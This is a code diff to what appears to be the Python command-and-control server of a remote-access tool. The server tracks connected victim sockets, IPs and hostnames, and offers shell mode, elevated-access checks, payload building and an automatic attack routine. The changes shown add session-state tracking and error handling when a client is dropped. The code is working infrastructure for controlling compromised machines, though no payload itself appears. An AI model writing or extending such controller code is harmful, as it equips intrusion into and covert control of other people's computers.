@@ -27,6 +27,7 @@ log = [] # Must not exceed 1
 silent = False
 shellmode = False  # ( ͡° ͜ʖ ͡°)
 elevated = False
+sessionStatus = False 
 
 class ClientManage:
     def __init__(self, client_socket):
@@ -39,7 +40,7 @@ class ClientManage:
     attack_port = [] # The port set to attack, must not exceed 1
     exploit_port = [] # The port used for exploitation, must not exceed 1
     global elevated
-
+    global sessionStatus
     def Log(self, data):
         del log[:]
         log.append(data)
@@ -72,10 +73,18 @@ class ClientManage:
         '''
         clear lists and kick
         '''
-        location = clients.index(self.client_socket)
-        clients.remove(clients[location])
-        iplist.remove(iplist[location])
-        hostList.remove(hostList[location])
+        global sessionStatus
+        try:
+            if(sessionStatus):
+                print( Style.BRIGHT + Fore.RED + "[ Session Closed ] " + Style.RESET_ALL + self.returnClientInfo())
+                sessionStatus = False
+            location = clients.index(self.client_socket)
+            clients.remove(clients[location])
+            iplist.remove(iplist[location])
+            hostList.remove(hostList[location])
+        except Exception as unkown_error:
+            print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Error : " + str(unkown_error))
+        
 
     def BuildPayload(self, payload):
         os.chdir("../payloads")
@@ -85,7 +94,7 @@ class ClientManage:
     def Session(self):
         global silent
         global shellmode
-        session = True
+        global sessionStatus
 
         def AutoAttack():
             # Get all settings
@@ -245,6 +254,7 @@ class ClientManage:
                 PrintTextFile("downloads/output.png")
             else:
                 print("[x] Failed to get payload output.")
+                
         # if(session):
         #     silent = True
         #     self.SendData("isadmin") # check admin first 
@@ -257,7 +267,9 @@ class ClientManage:
         #             print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} with Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
         #         else:
         #             print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} without Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
-        while(session):
+        
+        sessionStatus = True
+        while(sessionStatus):
             try:
                 try:
                     location = clients.index(self.client_socket)
